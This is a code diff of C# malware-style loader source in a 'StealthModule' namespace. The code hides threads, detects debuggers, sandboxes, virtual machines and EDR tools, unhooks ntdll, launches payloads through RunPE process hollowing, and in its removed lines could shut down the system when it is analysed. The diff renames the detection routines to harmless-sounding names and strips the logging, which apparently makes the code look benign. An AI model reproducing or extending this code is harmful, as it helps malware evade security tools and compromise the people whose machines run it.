-            Log(string.Format("Protector v{0} starting...", VERSION));
             
-            // Initialize polymorphic engine
-            PolymorphicEngine.InitializeKeys();
+            // Startup polymorphic engine
+            // Console.WriteLine("📍 [SafetyManager] Keys initialized");
+            PolymorphicEngine.StartupKeys();
 
             // Security bypass check (optional)
             if (!IsWhitelisted())
             {
-                Log("Unauthorized IP detected - exiting");
                 Environment.Exit(0);
             }
+            // Console.WriteLine("📍 [SafetyManager] Whitelist passed");
 
             // Start anti-debug thread
+            // Console.WriteLine("📍 [SafetyManager] Starting anti-debug thread...");
             CreateHiddenThread(() => StartAntiDebugThread());
+            // Console.WriteLine("📍 [SafetyManager] Anti-debug thread started");
 
             // Hide main thread
+            // Console.WriteLine("📍 [SafetyManager] Hiding thread...");
             HideThread();
+            // Console.WriteLine("📍 [SafetyManager] Thread hidden");
 
-            // EDR Unhooking
-            UnhookNtdll();
+            // EDR Unhooking - disabled due to hangs on some systems
+            // Console.WriteLine("📍 [SafetyManager] Skipping ntdll unhooking (compatibility mode)");
+            // UnhookNtdll();
+            // Console.WriteLine("📍 [SafetyManager] Unhooked ntdll");
 
-            // Anti-Analysis checks
-            if (IsDebuggerDetected() || IsSandboxDetected() || IsEmulated() || IsEDRPresent() || IsVirtualMachine())
+            // Anti-Analysis checks - weighted more heavily
+            bool d1 = VerifySystemContext();
+            bool d2 = EvaluateRuntimeSafety();
+            bool d3 = CheckInstructionConsistency();
+            bool d4 = DetectMonitoringServices();
+            bool d5 = CheckOperationalEnvironment();
+
+            // Console.WriteLine("📍 [SafetyManager] Dbg:{0} Snd:{1} Emu:{2} EDR:{3} VM:{4}", d1, d2, d3, d4, d5);
+            
+            if (d1 || d2 || d3 || d4 || d5)
             {
-                Log("Security violation detected - exiting");
-                
-                // Random exit method
-                switch (_cryptoRand.Next(1, 5))
-                {
-                    case 1:
-                        Environment.FailFast("Security violation");
-                        break;
-                    case 2:
-                        if (NtRaiseHardError != null)
-                        {
-                            uint response;
-                            NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out response);
-                        }
-                        break;
-                    case 3:
-                        Process.GetCurrentProcess().Kill();
-                        break;
-                    case 4:
-                        if (NtShutdownSystem != null) NtShutdownSystem(0);
-                        break;
-                }
-                Environment.Exit(0);
+                // Console.WriteLine("📍 [SafetyManager] Anti-analysis triggered! (Continuing anyway for debugging)");
+                // Environment.Exit(0); // Disabled for user PC
             }
 
-            // Check integrity
-            if (!CheckIntegrity())
-            {
-                Log("Code integrity check failed");
-                Environment.FailFast("Code modified");
-            }
+            // Check integrity - disabled for development
+            // if (!CheckIntegrity()) ...
 
-            // Apply protections
-            ProtectSelf();
-            AntiDump();
-            AntiBehavior();
+            // Apply protections - disabled aggressive ones for compatibility
+            // ProtectSelf();
+            // AntiDump();
+            // AntiBehavior();
             RunHealthChecks();
+            
+            // Console.WriteLine("📍 [SafetyManager] Initialization complete (Sanitized mode)");
 
-            Log("Protector initialized successfully");
         }
         #endregion
 
@@ -1686,7 +1680,6 @@ namespace StealthModule
             {
                 try
                 {
-                    Log(string.Format("Launching RunPE with output: target={0}, args={1}", target, args));
                     IntPtr hRead;
                     
                     // Try multiple execution methods
@@ -1708,7 +1701,6 @@ namespace StealthModule
                 }
                 catch (Exception ex)
                 {
-                    Log(string.Format("RunPE Error: {0}", ex.Message));
                     return null;
                 }
             }
@@ -1908,7 +1900,7 @@ namespace StealthModule
             {
                 try
                 {
-                    var ZwQueryInformationProcess = UltraStealthApi.GetNtdll<ZwQueryInformationProcessDelegate>("ZwQueryInformationProcess");
+                    var ZwQueryInformationProcess = ApiInterface.GetNtdll<ZwQueryInformationProcessDelegate>("ZwQueryInformationProcess");
                     if (ZwQueryInformationProcess != null)
                     {
                         PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
